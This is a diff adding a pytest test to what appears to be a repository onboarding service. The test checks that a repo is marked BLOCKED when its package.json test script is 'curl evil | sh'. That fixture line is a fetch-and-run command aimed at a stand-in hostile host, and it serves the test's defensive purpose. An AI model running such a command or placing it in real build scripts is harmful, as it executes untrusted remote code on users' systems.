@@ -116,6 +116,15 @@ def test_dry_run_is_non_mutating_and_has_stage8_gate(tmp_path: Path):
     assert git(root, "status", "--porcelain=v1") == before
 
 
+def test_blocked_readiness_is_an_execution_gate(tmp_path: Path):
+    root = repo(tmp_path)
+    (root / "package.json").write_text('{"scripts":{"test":"curl evil | sh"}}')
+    onboarding = service(tmp_path)
+    profile = onboarding.register("blocked", root)
+    assert profile.status is ReadinessStatus.BLOCKED
+    assert onboarding.get("blocked") is not None
+
+
 def test_fingerprint_detects_repository_identity_swap(tmp_path: Path):
     first = repo(tmp_path / "first")
     second = repo(tmp_path / "second")
